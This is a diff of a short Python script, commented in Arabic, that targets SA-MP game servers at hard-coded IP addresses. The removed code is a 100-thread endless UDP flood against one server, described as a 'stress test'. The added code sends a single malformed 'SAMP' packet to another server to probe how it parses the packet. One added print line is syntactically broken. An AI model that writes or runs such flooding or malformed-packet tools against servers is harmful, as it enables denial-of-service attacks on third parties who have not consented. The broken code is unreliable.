@@ -1,39 +1,24 @@
 import socket
-import threading
-import sys
 
 # معلومات الهدف
-TARGET_IP = "94.23.168.153"  # IP السيرفر
-TARGET_PORT = 2343        # المنفذ
-THREADS_COUNT = 100       # عدد الخيوط
+TARGET_IP = "89.46.1.130"
+TARGET_PORT = 7000
 
-def stress_worker():
+def send_malformed_packet():
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    payload = b'SAMP' + b'\xFF' * 1024
     
-    print("بدء تشغيل خيط الضغط...")
-    while True:
-        try:
-            client.sendto(payload, (TARGET_IP, TARGET_PORT))
-        except Exception:
-            pass
-
-def main():
-    print(f"=== بدء اختبار الضغط الشامل على {TARGET_IP}:{TARGET_PORT} باستخدام {THREADS_COUNT} خيط ===")
+    # بناء حزمة بمحتوى غير منتظم أو بيانات مبعثرة لاختبار الـ Parsing
+    # يتم دمج علامات تفعيل وهمية وبايتات عشوائية طويلة لتجربة معالجة الاستثناءات
+    malformed_payload = b'SAMP' + b'\x00\xFF\xFF\x00' * 32 + b'\x01\x02\x03\x04'
     
-    threads = []
-    for _ in range(THREADS_COUNT):
-        t = threading.Thread(target=stress_worker)
-        t.daemon = True
-        threads.append(t)
-        t.start()
-        
     try:
-        while True:
-            threading.Event().wait(1)
-    except KeyboardInterrupt:
-        print("\nتم إيقاف الاختبار.")
-        sys.exit(0)
+        print(f"جاري إرسال الحزمة غير المنتظمة إلى {TARGET_IP}:{TARGET_PORT}...")
+        client.sendto(malformed_payload, (TARGET_IP, TARGET_PORT))
+        print("تم إرسال الحزمة بنجاح. راقب استجابة السيرفر أو الـ Console.")
+    except Exception as e:
+        print(fُحدث خطأ أثناء الإرسال: {e}")
+    finally:
+        client.close()
 
 if __name__ == "__main__":
-    main()
+    send_malformed_packet()
